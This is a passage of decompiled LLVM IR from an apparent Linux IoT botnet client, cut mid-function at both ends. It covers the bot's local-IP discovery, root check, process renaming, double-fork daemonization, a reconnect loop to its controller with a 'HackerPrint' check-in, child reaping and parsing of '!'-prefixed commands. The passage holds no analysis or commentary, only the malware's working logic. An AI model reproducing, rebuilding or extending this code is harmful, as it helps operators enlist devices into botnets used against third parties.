  %stack_var_-4170 = alloca i32, align 4
  %stack_var_-4188 = alloca i32, align 4
  %stack_var_-4156 = alloca i8, align 1
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80513ac = load i32, i32* @ebp, align 4
  store i32 %v0_80513ac, i32* %stack_var_-4, align 4
  %v5_80513cc = call i32 @socket(i32 2, i32 2, i32 0)
  %v13_80513d4 = icmp eq i32 %v5_80513cc, -1
  %v1_80513d8 = icmp eq i1 %v13_80513d4, false
  br i1 %v1_80513d8, label %dec_label_pc_80513e9, label %dec_label_pc_80515c7

dec_label_pc_80513e9:                             ; preds = %entry
  %v2_80513e9 = ptrtoint i32* %stack_var_-40 to i32
  store i32 2, i32* %stack_var_-40, align 4
  %v2_8051414 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_805d3f8.895 to i32))
  %v3_8051423 = call i32 @htons(i16 53)
  %v5_8051444 = call i32 @__libc_connect(i32 %v5_80513cc, i32 %v2_80513e9, i32 16)
  %v13_805144c = icmp eq i32 %v5_8051444, -1
  %v1_8051450 = icmp eq i1 %v13_805144c, false
  br i1 %v1_8051450, label %dec_label_pc_8051461, label %dec_label_pc_80515c7

dec_label_pc_8051461:                             ; preds = %dec_label_pc_80513e9
  store i32 16, i32* %stack_var_-60, align 4
  %v2_8051468 = ptrtoint i32* %stack_var_-56 to i32
  %v2_805146b = ptrtoint i32* %stack_var_-60 to i32
  %v5_805147c = call i32 @__GI_getsockname(i32 %v5_80513cc, i32 %v2_8051468, i32 %v2_805146b)
  %v13_8051484 = icmp eq i32 %v5_805147c, -1
  %v1_8051488 = icmp eq i1 %v13_8051484, false
  br i1 %v1_8051488, label %dec_label_pc_8051499, label %dec_label_pc_80515c7

dec_label_pc_8051499:                             ; preds = %dec_label_pc_8051461
  %v5_80514b0 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805d400.896, i32 0, i32 0), i32 0)
  %v2_8051515 = ptrtoint i8* %stack_var_-4156 to i32
  %v5_805152d34 = call i32 @fdgets(i32 %v2_8051515, i32 4096, i32 %v5_80514b0)
  %v1_805153235 = icmp eq i32 %v5_805152d34, 0
  %v1_805153437 = icmp eq i1 %v1_805153235, false
  br i1 %v1_805153437, label %dec_label_pc_80514ba, label %dec_label_pc_8051536

dec_label_pc_80514ba:                             ; preds = %dec_label_pc_8051499, %dec_label_pc_80514f4
  %v5_80514cb = call i32 @strstr(i32 %v2_8051515, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805d410.897, i32 0, i32 0))
  %v1_80514d0 = icmp eq i32 %v5_80514cb, 0
  br i1 %v1_80514d0, label %dec_label_pc_80514f4, label %dec_label_pc_80514e2

dec_label_pc_80514df:                             ; preds = %dec_label_pc_80514e2
  %v4_80514e2 = ptrtoint i8* %storemerge5 to i32
  %v5_80514df = add i32 %v4_80514e2, 1
  %v22_80514df = inttoptr i32 %v5_80514df to i8*
  br label %dec_label_pc_80514e2

dec_label_pc_80514e2:                             ; preds = %dec_label_pc_80514ba, %dec_label_pc_80514df
  %storemerge5 = phi i8* [ %v22_80514df, %dec_label_pc_80514df ], [ %stack_var_-4156, %dec_label_pc_80514ba ]
  %v2_80514e5 = load i8, i8* %storemerge5, align 1
  %v10_80514e8 = icmp eq i8 %v2_80514e5, 9
  %v1_80514ea = icmp eq i1 %v10_80514e8, false
  br i1 %v1_80514ea, label %dec_label_pc_80514df, label %dec_label_pc_80514ec

dec_label_pc_80514ec:                             ; preds = %dec_label_pc_80514e2
  store i8 0, i8* %storemerge5, align 1
  br label %dec_label_pc_8051536

dec_label_pc_80514f4:                             ; preds = %dec_label_pc_80514ba
  %v6_8051510 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_805152d = call i32 @fdgets(i32 %v2_8051515, i32 4096, i32 %v5_80514b0)
  %v1_8051532 = icmp eq i32 %v5_805152d, 0
  %v1_8051534 = icmp eq i1 %v1_8051532, false
  br i1 %v1_8051534, label %dec_label_pc_80514ba, label %dec_label_pc_8051536

dec_label_pc_8051536:                             ; preds = %dec_label_pc_8051499, %dec_label_pc_80514f4, %dec_label_pc_80514ec
  %v2_805153c = call i32 @__libc_close(i32 %v5_80514b0)
  %v3_8051541 = load i8, i8* %stack_var_-4156, align 1
  %v4_8051548 = icmp eq i8 %v3_8051541, 0
  br i1 %v4_8051548, label %dec_label_pc_80515ae, label %dec_label_pc_805154c

dec_label_pc_805154c:                             ; preds = %dec_label_pc_8051536
  %v2_8051556 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_8051556, i32* @eax, align 4
  %tmp32 = bitcast i32* %stack_var_-4188 to i8*
  %v5_805155f = call i32 @strcpy(i8* %tmp32, i32 %v2_8051515)
  %v5_805157c = call i32 @ioctl(i32 %v5_80513cc, i32 35111, i32 %v2_8051556)
  %v2_8051593 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_805158a

dec_label_pc_805158a:                             ; preds = %dec_label_pc_805154c, %dec_label_pc_805158a
  %storemerge33 = phi i32 [ 0, %dec_label_pc_805154c ], [ %v4_80515a5, %dec_label_pc_805158a ]
  %v2_8051599 = add i32 %storemerge33, %v2_8051593
  %v1_805159c = inttoptr i32 %v2_8051599 to i8*
  %v2_805159c = load i8, i8* %v1_805159c, align 1
  %v3_805159f = add i32 %storemerge33, ptrtoint (i8** @global_var_805f4f0.898 to i32)
  %v4_805159f = inttoptr i32 %v3_805159f to i8*
  store i8 %v2_805159c, i8* %v4_805159f, align 1
  %v4_80515a5 = add nuw nsw i32 %storemerge33, 1
  %exitcond = icmp eq i32 %v4_80515a5, 6
  br i1 %exitcond, label %dec_label_pc_80515ae, label %dec_label_pc_805158a

dec_label_pc_80515ae:                             ; preds = %dec_label_pc_805158a, %dec_label_pc_8051536
  %v2_80515b4 = call i32 @__libc_close(i32 %v5_80513cc)
  br label %dec_label_pc_80515c7

dec_label_pc_80515c7:                             ; preds = %entry, %dec_label_pc_80513e9, %dec_label_pc_8051461, %dec_label_pc_80515ae
  %stack_var_-4204.0 = phi i32 [ %tmp, %dec_label_pc_80515ae ], [ 0, %dec_label_pc_8051461 ], [ 0, %dec_label_pc_80513e9 ], [ 0, %entry ]
  %v2_80515cd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80515cd, i32* @ebp, align 4
  ret i32 %stack_var_-4204.0

; uselistorder directives
  uselistorder i8* %storemerge5, { 0, 2, 1 }
  uselistorder i32 %v2_8051515, { 1, 3, 2, 0 }
  uselistorder i32 %v5_80514b0, { 1, 2, 0 }
  uselistorder i32 %v5_80513cc, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 3, 1, 0, 2 }
  uselistorder i32 (i16)* @htons, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 13, 15, 14 }
  uselistorder label %dec_label_pc_80515c7, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805158a, { 1, 0 }
  uselistorder label %dec_label_pc_8051536, { 1, 2, 0 }
  uselistorder label %dec_label_pc_80514e2, { 1, 0 }
  uselistorder label %dec_label_pc_80514ba, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v0_80515cf = load i32, i32* @ebp, align 4
  %v3_80515e4 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_805d41b.899 to i32), i32 0)
  %v10_80515e9 = icmp eq i32 %v3_80515e4, -1
  %v4_80515fe = select i1 %v10_80515e9, i32 ptrtoint ([7 x i8]* @global_var_805d432.901 to i32), i32 ptrtoint ([7 x i8]* @global_var_805d42b.900 to i32)
  store i32 %v0_80515cf, i32* @ebp, align 4
  ret i32 %v4_80515fe
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-5360 = alloca i8*, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8051603 = ptrtoint i32* %stack_var_4 to i32
  store i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_805d41b.899, i32 0, i32 0), i8** %stack_var_-5360, align 4
  %v4_8051635 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_805d41b.899 to i32), i32 0)
  %v10_805163a = icmp eq i32 %v4_8051635, -1
  %. = select i1 %v10_805163a, i32 ptrtoint ([19 x i8]* @global_var_805d43f.904 to i32), i32 ptrtoint ([5 x i8]* @global_var_805d43a.903 to i32)
  %v0_805164f = call i32 @geteuid()
  %v1_8051654 = icmp eq i32 %v0_805164f, 0
  %v1_8051656 = icmp eq i1 %v1_8051654, false
  br i1 %v1_8051656, label %dec_label_pc_8051662, label %dec_label_pc_8051658

dec_label_pc_8051658:                             ; preds = %entry
  store i32 0, i32* @global_var_805f1ac.905, align 4
  br label %dec_label_pc_8051662

dec_label_pc_8051662:                             ; preds = %entry, %dec_label_pc_8051658
  %v0_8051662 = call i32 @getBuild()
  %v0_805166a = load i32, i32* @global_var_8065768.232, align 8
  %v4_805166f = inttoptr i32 %v0_805166a to i8*
  store i8* %v4_805166f, i8** %stack_var_-5360, align 4
  %v2_8051672 = call i32 @__GI_inet_ntoa(i32 %v0_805166a)
  store i32 %v2_8051672, i32* @ebx, align 4
  %v0_8051679 = call i32 @getBuild()
  %v0_805167e = load i32, i32* @ebx, align 4
  %v5_805167e = inttoptr i32 %v0_805167e to i8*
  %v5_8051682 = inttoptr i32 %v0_8051679 to i8*
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805d452.906, i32 0, i32 0), i8** %stack_var_-5360, align 4
  %v9_805168d = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805d452.906, i32 0, i32 0), i8* %v5_8051682, i8* %v5_805167e)
  %v1_8051698 = add i32 %v2_8051603, 4
  %v2_8051698 = inttoptr i32 %v1_8051698 to i32*
  %v3_8051698 = load i32, i32* %v2_8051698, align 4
  %v1_805169b = inttoptr i32 %v3_8051698 to i32*
  %v2_805169b = load i32, i32* %v1_805169b, align 4
  store i1 false, i1* @df, align 1
  %v4_80516ab = inttoptr i32 %v2_805169b to i8*
  %v3_80516b1 = call i32 @_strlen(i8* %v4_80516ab)
  %v3_80516c0 = load i32, i32* %v2_8051698, align 4
  %v1_80516c3 = inttoptr i32 %v3_80516c0 to i32*
  %v2_80516c3 = load i32, i32* %v1_80516c3, align 4
  %v4_80516d1 = inttoptr i32 %v2_80516c3 to i8*
  store i8* %v4_80516d1, i8** %stack_var_-5360, align 4
  %v7_80516d4 = call i32 @strncpy(i8* %v4_80516d1, i32 ptrtoint (i32* @global_var_805d439.902 to i32), i32 %v3_80516b1)
  store i32 %v2_8051603, i32* @edi, align 4
  %v3_80516df = load i32, i32* %v2_8051698, align 4
  %v1_80516e2 = inttoptr i32 %v3_80516df to i32*
  %v2_80516e2 = load i32, i32* %v1_80516e2, align 4
  %v4_80516ed = inttoptr i32 %v2_80516e2 to i8*
  store i8* %v4_80516ed, i8** %stack_var_-5360, align 4
  %v4_80516f0 = call i32 @sprintf(i32 %v2_80516e2, i32 %.)
  store i8* inttoptr (i32 15 to i8*), i8** %stack_var_-5360, align 4
  %v9_805171b = call i32 @prctl(i32 15, i32 %., i32 0, i32 0, i32 0)
  store i8* null, i8** %stack_var_-5360, align 4
  %v3_8051727 = call i32 @__GI_time(i32* null)
  store i32 %v3_8051727, i32* @ebx, align 4
  %v0_805172e = call i32 @__libc_getpid()
  %v1_8051733 = load i32, i32* @ebx, align 4
  %v2_8051733 = xor i32 %v1_8051733, %v0_805172e
  store i32 %v2_8051733, i32* @eax, align 4
  %v4_8051735 = inttoptr i32 %v2_8051733 to i8*
  store i8* %v4_8051735, i8** %stack_var_-5360, align 4
  %v2_8051738 = call i32 @srand(i32 %v2_8051733)
  store i8* null, i8** %stack_var_-5360, align 4
  %v3_8051744 = call i32 @__GI_time(i32* null)
  store i32 %v3_8051744, i32* @ebx, align 4
  %v0_805174b = call i32 @__libc_getpid()
  %v1_8051750 = load i32, i32* @ebx, align 4
  %v2_8051750 = xor i32 %v1_8051750, %v0_805174b
  %v4_8051752 = inttoptr i32 %v2_8051750 to i8*
  store i8* %v4_8051752, i8** %stack_var_-5360, align 4
  %v2_8051755 = call i32 @init_rand(i32 %v2_8051750)
  %v0_805175a = call i32 @getOurIP()
  %v0_805175f = load i8*, i8** %stack_var_-5360, align 4
  %v1_805175f = ptrtoint i8* %v0_805175f to i32
  %v2_805175f = call i32 @__libc_fork(i32 %v1_805175f)
  %v4_8051767 = icmp eq i32 %v2_805175f, 0
  br i1 %v4_8051767, label %dec_label_pc_8051799, label %dec_label_pc_8051793.thread

dec_label_pc_8051793.thread:                      ; preds = %dec_label_pc_8051662
  %v2_8051775 = ptrtoint i32* %stack_var_-92 to i32
  %v4_805177f = inttoptr i32 %v2_805175f to i8*
  store i8* %v4_805177f, i8** %stack_var_-5360, align 4
  %v6_8051782 = call i32 @__libc_waitpid(i32 %v2_805175f, i32 %v2_8051775, i32 0)
  store i32 %v6_8051782, i32* @eax, align 4
  store i8* null, i8** %stack_var_-5360, align 4
  %v2_805178e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80517b3

dec_label_pc_8051799:                             ; preds = %dec_label_pc_8051662
  %v0_8051799 = load i8*, i8** %stack_var_-5360, align 4
  %v1_8051799 = ptrtoint i8* %v0_8051799 to i32
  %v2_8051799 = call i32 @__libc_fork(i32 %v1_8051799)
  store i32 %v2_8051799, i32* @eax, align 4
  %v4_80517a1 = icmp eq i32 %v2_8051799, 0
  br i1 %v4_80517a1, label %dec_label_pc_80517b3, label %dec_label_pc_80517a7

dec_label_pc_80517a7:                             ; preds = %dec_label_pc_8051799
  store i8* null, i8** %stack_var_-5360, align 4
  %v2_80517ae = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80517b3

dec_label_pc_80517b3:                             ; preds = %dec_label_pc_8051793.thread, %dec_label_pc_8051799, %dec_label_pc_80517a7
  %v0_80517b3 = call i32 @__GI_setsid()
  store i8* bitcast (i32* @global_var_805d45f.907 to i8*), i8** %stack_var_-5360, align 4
  %v2_80517bf = call i32 @chdir(i32 ptrtoint (i32* @global_var_805d45f.907 to i32))
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-5360, align 4
  %v4_80517d3 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_8051e0b = ptrtoint i32* %stack_var_-5252 to i32
  %tmp95 = bitcast i32* %stack_var_-5252 to i8*
  %v1_8051ae8 = or i32 %v2_8051e0b, 1
  %v5_8051b1d = inttoptr i32 %v1_8051ae8 to i8*
  %tmp96 = bitcast i8** %stack_var_-36 to i32*
  %tmp97 = bitcast i8** %stack_var_-132 to i32*
  %v2_8051c30 = ptrtoint i32* %stack_var_-1156 to i32
  %tmp98 = bitcast i32* %stack_var_-1156 to i8*
  br label %dec_label_pc_80517da

dec_label_pc_80517da:                             ; preds = %dec_label_pc_80517e3, %dec_label_pc_8051e0b, %dec_label_pc_80517b3
  %v0_80517da = call i32 @initConnection()
  %v1_80517df = icmp eq i32 %v0_80517da, 0
  br i1 %v1_80517df, label %dec_label_pc_80517f1, label %dec_label_pc_80517e3

dec_label_pc_80517e3:                             ; preds = %dec_label_pc_80517da
  store i8* inttoptr (i32 5 to i8*), i8** %stack_var_-5360, align 4
  %v2_80517ea = call i32 @sleep(i32 5)
  br label %dec_label_pc_80517da

dec_label_pc_80517f1:                             ; preds = %dec_label_pc_80517da
  %v0_80517f1 = call i32 @getBuild()
  store i32 %v0_80517f1, i32* @ebx, align 4
  %v0_80517f8 = load i32, i32* @global_var_8065768.232, align 8
  %v4_80517fd = inttoptr i32 %v0_80517f8 to i8*
  store i8* %v4_80517fd, i8** %stack_var_-5360, align 4
  %v2_8051800 = call i32 @__GI_inet_ntoa(i32 %v0_80517f8)
  %v0_8051805 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_8051805 = ptrtoint i8* %v0_8051805 to i32
  store i8* %v0_8051805, i8** %stack_var_-5360, align 4
  %v4_8051826 = call i32 @HackerPrint(i32 %v1_8051805, i32 ptrtoint (i32* @global_var_805d46c.909 to i32))
  br label %dec_label_pc_8051e0b

dec_label_pc_805184a:                             ; preds = %dec_label_pc_8051a39, %dec_label_pc_80519f2
  %v2_805184d = mul i32 %storemerge18, 4
  %v0_8051852 = load i32, i32* @global_var_8065774.25, align 4
  %v2_8051857 = add i32 %v0_8051852, %v2_805184d
  %v1_805185a = inttoptr i32 %v2_8051857 to i32*
  %v2_805185a = load i32, i32* %v1_805185a, align 4
  %v4_805186c = inttoptr i32 %v2_805185a to i8*
  store i8* %v4_805186c, i8** %stack_var_-5360, align 4
  %v6_805186f = call i32 @__libc_waitpid(i32 %v2_805185a, i32 0, i32 1)
  %tmp99 = icmp slt i32 %v6_805186f, 1
  %.pre = add i32 %storemerge18, 1
  br i1 %tmp99, label %dec_label_pc_80519ef, label %dec_label_pc_805187c

dec_label_pc_805187c:                             ; preds = %dec_label_pc_805184a
  br label %dec_label_pc_80518af

dec_label_pc_8051885:                             ; preds = %dec_label_pc_80518af, %dec_label_pc_80518e9
  %v2_8051888 = mul i32 %storemerge20, 4
  %v0_805188d = load i32, i32* @global_var_8065774.25, align 4
  %v2_8051892 = add i32 %v0_805188d, %v2_8051888
  %v1_8051895 = add i32 %v2_8051892, -4
  %v1_80518a8 = inttoptr i32 %v2_8051892 to i32*
  %v2_80518a8 = load i32, i32* %v1_80518a8, align 4
  %v2_80518aa = inttoptr i32 %v1_8051895 to i32*
  store i32 %v2_80518a8, i32* %v2_80518aa, align 4
  %v4_80518ac = add i32 %storemerge20, 1
  br label %dec_label_pc_80518af

dec_label_pc_80518af:                             ; preds = %dec_label_pc_805187c, %dec_label_pc_8051885
  %storemerge20 = phi i32 [ %v4_80518ac, %dec_label_pc_8051885 ], [ %.pre, %dec_label_pc_805187c ]
  %v0_80518c9 = load i32, i32* @global_var_805f4ec.24, align 4
  %v10_80518e1 = icmp eq i32 %v0_80518c9, 0
  br i1 %v10_80518e1, label %dec_label_pc_80518e9, label %dec_label_pc_8051885

dec_label_pc_80518e9:                             ; preds = %dec_label_pc_80518af
  %v0_80518c3 = load i32, i32* @global_var_805f4e8.23, align 8
  store i32 0, i32* @edi, align 4
  %v10_80518fd = icmp ult i32 %storemerge20, %v0_80518c3
  br i1 %v10_80518fd, label %dec_label_pc_8051885, label %dec_label_pc_8051905

dec_label_pc_8051905:                             ; preds = %dec_label_pc_80518e9
  %v2_8051908 = mul i32 %storemerge20, 4
  %v0_805190d = load i32, i32* @global_var_8065774.25, align 4
  %v2_8051912 = add i32 %v2_8051908, -4
  %v1_8051915 = add i32 %v2_8051912, %v0_805190d
  %v1_8051918 = inttoptr i32 %v1_8051915 to i32*
  store i32 0, i32* %v1_8051918, align 4
  %v0_805191e = load i32, i32* @global_var_805f4e8.23, align 8
  %v0_8051923 = load i32, i32* @global_var_805f4ec.24, align 4
  %v1_8051929 = add i32 %v0_805191e, -1
  %v4_8051929 = icmp ne i32 %v0_805191e, 0
  %v2_805192c = zext i1 %v4_8051929 to i32
  %v3_805192c = add i32 %v0_8051923, -1
  %v4_805192c = add i32 %v3_805192c, %v2_805192c
  store i32 %v1_8051929, i32* @global_var_805f4e8.23, align 8
  store i32 %v4_805192c, i32* @global_var_805f4ec.24, align 4
  %v2_8051949 = mul i32 %v1_8051929, 4
  %v1_805194c = add i32 %v2_8051949, 4
  %v4_805194f = inttoptr i32 %v1_805194c to i8*
  store i8* %v4_805194f, i8** %stack_var_-5360, align 4
  %v2_8051952 = call i32 @malloc(i32 %v1_805194c)
  br label %dec_label_pc_8051985

dec_label_pc_8051963:                             ; preds = %dec_label_pc_8051985, %dec_label_pc_80519be
  %v2_8051966 = mul i32 %storemerge19, 4
  %v5_805196b = add i32 %v2_8051966, %v2_8051952
  %v0_8051976 = load i32, i32* @global_var_8065774.25, align 4
  %v2_805197b = add i32 %v0_8051976, %v2_8051966
  %v1_805197e = inttoptr i32 %v2_805197b to i32*
  %v2_805197e = load i32, i32* %v1_805197e, align 4
  %v2_8051980 = inttoptr i32 %v5_805196b to i32*
  store i32 %v2_805197e, i32* %v2_8051980, align 4
  %v4_8051982 = add i32 %storemerge19, 1
  br label %dec_label_pc_8051985

dec_label_pc_8051985:                             ; preds = %dec_label_pc_8051905, %dec_label_pc_8051963
  %storemerge19 = phi i32 [ %v4_8051982, %dec_label_pc_8051963 ], [ 0, %dec_label_pc_8051905 ]
  %v0_8051999 = load i32, i32* @global_var_805f4e8.23, align 8
  %v0_805199e = load i32, i32* @global_var_805f4ec.24, align 4
  %v10_80519b6 = icmp eq i32 %v0_805199e, 0
  br i1 %v10_80519b6, label %dec_label_pc_80519be, label %dec_label_pc_8051963

dec_label_pc_80519be:                             ; preds = %dec_label_pc_8051985
  store i32 %v0_8051999, i32* @edi, align 4
  %v10_80519d2 = icmp ult i32 %storemerge19, %v0_8051999
  br i1 %v10_80519d2, label %dec_label_pc_8051963, label %dec_label_pc_80519da

dec_label_pc_80519da:                             ; preds = %dec_label_pc_80519be
  %v0_80519da = load i32, i32* @global_var_8065774.25, align 4
  %v4_80519df = inttoptr i32 %v0_80519da to i8*
  store i8* %v4_80519df, i8** %stack_var_-5360, align 4
  %v2_80519e2 = call i32 @free(i32 %v0_80519da)
  store i32 %v2_8051952, i32* @global_var_8065774.25, align 4
  br label %dec_label_pc_80519ef

dec_label_pc_80519ef:                             ; preds = %dec_label_pc_805184a, %dec_label_pc_80519da
  br label %dec_label_pc_80519f2

dec_label_pc_80519f2:                             ; preds = %dec_label_pc_8051e0b, %dec_label_pc_80519ef
  %storemerge18 = phi i32 [ %.pre, %dec_label_pc_80519ef ], [ 0, %dec_label_pc_8051e0b ]
  %v1_80519fb = ashr i32 %storemerge18, 31
  %v0_8051a02 = load i32, i32* @global_var_805f4e8.23, align 8
  %v0_8051a07 = load i32, i32* @global_var_805f4ec.24, align 4
  %v10_8051a1f = icmp ult i32 %v1_80519fb, %v0_8051a07
  br i1 %v10_8051a1f, label %dec_label_pc_805184a, label %dec_label_pc_8051a2b

dec_label_pc_8051a2b:                             ; preds = %dec_label_pc_80519f2
  %v6_8051a37 = icmp ugt i32 %v1_80519fb, %v0_8051a07
  br i1 %v6_8051a37, label %dec_label_pc_8051a4b, label %dec_label_pc_8051a39

dec_label_pc_8051a39:                             ; preds = %dec_label_pc_8051a2b
  store i32 %v0_8051a02, i32* @edi, align 4
  %v10_8051a3f = icmp ult i32 %storemerge18, %v0_8051a02
  br i1 %v10_8051a3f, label %dec_label_pc_805184a, label %dec_label_pc_8051a4b

dec_label_pc_8051a4b:                             ; preds = %dec_label_pc_8051a39, %dec_label_pc_8051a2b
  %v0_8051a4e = load i32, i32* @ebp, align 4
  %v2_8051a4e = add i32 %v7_8051e26, -5244
  %v3_8051a4e = add i32 %v2_8051a4e, %v0_8051a4e
  %v4_8051a4e = inttoptr i32 %v3_8051a4e to i8*
  store i8 0, i8* %v4_8051a4e, align 1
  store i8* %tmp95, i8** %stack_var_-5360, align 4
  %v3_8051a5f = call i32 @trim(i8* %tmp95)
  store i8* %tmp95, i8** %stack_var_-5360, align 4
  %v5_8051a75 = call i32 @strstr(i32 %v2_8051e0b, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059297.21, i32 0, i32 0))
  %v12_8051a82 = icmp eq i32 %v5_8051a75, %v2_8051e0b
  %v1_8051a84 = icmp eq i1 %v12_8051a82, false
  br i1 %v1_8051a84, label %dec_label_pc_8051aa0, label %dec_label_pc_8051a86

dec_label_pc_8051a86:                             ; preds = %dec_label_pc_8051a4b
  %v0_8051a86 = load i8*, i8** @global_var_805f4e0.20, align 4
  %v1_8051a86 = ptrtoint i8* %v0_8051a86 to i32
  store i8* %v0_8051a86, i8** %stack_var_-5360, align 4
  %v4_8051a96 = call i32 @HackerPrint(i32 %v1_8051a86, i32 ptrtoint ([5 x i8]* @global_var_805d4e8.910 to i32))
  br label %dec_label_pc_8051e0b

dec_label_pc_8051aa0:                             ; preds = %dec_label_pc_8051a4b
  store i8* %tmp95, i8** %stack_var_-5360, align 4
  %v5_8051ab1 = call i32 @strstr(i32 %v2_8051e0b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805d4ed.911, i32 0, i32 0))
  store i32 %v5_8051ab1, i32* @edx, align 4
  store i32 %v2_8051e0b, i32* @eax, align 4
  %v12_8051abe = icmp eq i32 %v5_8051ab1, %v2_8051e0b
  %v1_8051ac0 = icmp eq i1 %v12_8051abe, false
  br i1 %v1_8051ac0, label %dec_label_pc_8051ace, label %dec_label_pc_8051ac2

dec_label_pc_8051ac2:                             ; preds = %dec_label_pc_8051aa0
  store i8* null, i8** %stack_var_-5360, align 4
  %v2_8051ac9 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8051ace

dec_label_pc_8051ace:                             ; preds = %dec_label_pc_8051aa0, %dec_label_pc_8051ac2
  %v2_8051ada = load i8, i8* %tmp95, align 4
  %v10_8051add = icmp eq i8 %v2_8051ada, 33
  %v1_8051adf = icmp eq i1 %v10_8051add, false
  br i1 %v1_8051adf, label %dec_label_pc_8051e0b, label %dec_label_pc_8051ae5

dec_label_pc_8051ae5:                             ; preds = %dec_label_pc_8051ace
  %v2_8051af4103 = load i8, i8* %v5_8051b1d, align 1
  %v7_8051af7110 = icmp eq i8 %v2_8051af4103, 32
  br i1 %v7_8051af7110, label %dec_label_pc_8051b05, label %dec_label_pc_8051afb

dec_label_pc_8051aee:                             ; preds = %dec_label_pc_8051afb
  %v5_8051aee = add i32 %storemerge17.in112, 1
  %storemerge17 = inttoptr i32 %v5_8051aee to i8*
  %v2_8051af4 = load i8, i8* %storemerge17, align 1
  %v7_8051af7 = icmp eq i8 %v2_8051af4, 32
  br i1 %v7_8051af7, label %dec_label_pc_8051b05, label %dec_label_pc_8051afb

dec_label_pc_8051afb:                             ; preds = %dec_label_pc_8051ae5, %dec_label_pc_8051aee
  %storemerge17113 = phi i8* [ %storemerge17, %dec_label_pc_8051aee ], [ %v5_8051b1d, %dec_label_pc_8051ae5 ]
  %storemerge17.in112 = phi i32 [ %v5_8051aee, %dec_label_pc_8051aee ], [ %v1_8051ae8, %dec_label_pc_8051ae5 ]
  %v2_8051afe = load i8, i8* %storemerge17113, align 1
  %v4_8051b01 = icmp eq i8 %v2_8051afe, 0
  %v1_8051b03 = icmp eq i1 %v4_8051b01, false
  br i1 %v1_8051b03, label %dec_label_pc_8051aee, label %dec_label_pc_8051b05

dec_label_pc_8051b05:                             ; preds = %dec_label_pc_8051aee, %dec_label_pc_8051afb, %dec_label_pc_8051ae5
  %storemerge17.lcssa = phi i8* [ %v5_8051b1d, %dec_label_pc_8051ae5 ], [ %storemerge17113, %dec_label_pc_8051afb ], [ %storemerge17, %dec_label_pc_8051aee ]
  %v2_8051b08 = load i8, i8* %storemerge17.lcssa, align 1
  %v4_8051b0b = icmp eq i8 %v2_8051b08, 0
  br i1 %v4_8051b0b, label %dec_label_pc_8051e0b, label %dec_label_pc_8051b13

dec_label_pc_8051b13:                             ; preds = %dec_label_pc_8051b05
  store i8 0, i8* %storemerge17.lcssa, align 1
  %v3_8051b37 = call i32 @_strlen(i8* %v5_8051b1d)
  %v6_8051b3e = add i32 %v2_8051e0b, %v3_8051b37
  %v1_8051b41 = add i32 %v6_8051b3e, 2
  %v5_8051b44 = inttoptr i32 %v1_8051b41 to i8*
  br label %dec_label_pc_8051b6e

dec_label_pc_8051b49:                             ; preds = %dec_label_pc_8051b97, %dec_label_pc_8051b6e
  %v3_8051b60 = call i32 @_strlen(i8* %v5_8051b44)
  %v6_8051b67 = add i32 %v1_8051b41, %v3_8051b60
  %v1_8051b6a = add i32 %v6_8051b67, -1
  %v1_8051b6b = inttoptr i32 %v1_8051b6a to i8*
  store i8 0, i8* %v1_8051b6b, align 1
  br label %dec_label_pc_8051b6e

dec_label_pc_8051b6e:                             ; preds = %dec_label_pc_8051b13, %dec_label_pc_8051b49
  %v3_8051b85 = call i32 @_strlen(i8* %v5_8051b44)
  %v6_8051b8c = add i32 %v1_8051b41, %v3_8051b85
  %v1_8051b8f = add i32 %v6_8051b8c, -1
  %v1_8051b90 = inttoptr i32 %v1_8051b8f to i8*
  %v2_8051b90 = load i8, i8* %v1_8051b90, align 1
  %v10_8051b93 = icmp eq i8 %v2_8051b90, 10
  br i1 %v10_8051b93, label %dec_label_pc_8051b49, label %dec_label_pc_8051b97

dec_label_pc_8051b97:                             ; preds = %dec_label_pc_8051b6e
  store i1 false, i1* @df, align 1
  store i32 %v1_8051b41, i32* @edi, align 4
  %v3_8051bae = call i32 @_strlen(i8* %v5_8051b44)
  %v4_8051bae = mul i32 %v3_8051bae, -1
  %v5_8051bae = add i32 %v4_8051bae, -2
  store i32 %v5_8051bae, i32* @ecx, align 4
  %v6_8051bb5 = sub i32 %v1_8051b41, %v4_8051bae
  %v1_8051bb8 = add i32 %v6_8051bb5, -1
  %v1_8051bb9 = inttoptr i32 %v1_8051bb8 to i8*
  %v2_8051bb9 = load i8, i8* %v1_8051bb9, align 1
  %v10_8051bbc = icmp eq i8 %v2_8051bb9, 13
  br i1 %v10_8051bbc, label %dec_label_pc_8051b49, label %dec_label_pc_8051bc0

dec_label_pc_8051bc0:                             ; preds = %dec_label_pc_8051b97
